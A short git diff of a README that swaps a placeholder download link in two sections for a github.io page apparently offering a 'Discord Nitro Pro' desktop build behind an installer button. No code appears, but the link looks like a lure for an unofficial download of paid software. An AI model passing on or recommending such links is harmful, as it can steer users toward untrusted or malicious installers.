@@ -17,7 +17,7 @@ The build covers both portable and installed modes from a single package, and it
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cam-young-28.github.io/discord-nitro-pro-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with other installations of similar software is supported; the build
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cam-young-28.github.io/discord-nitro-pro-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
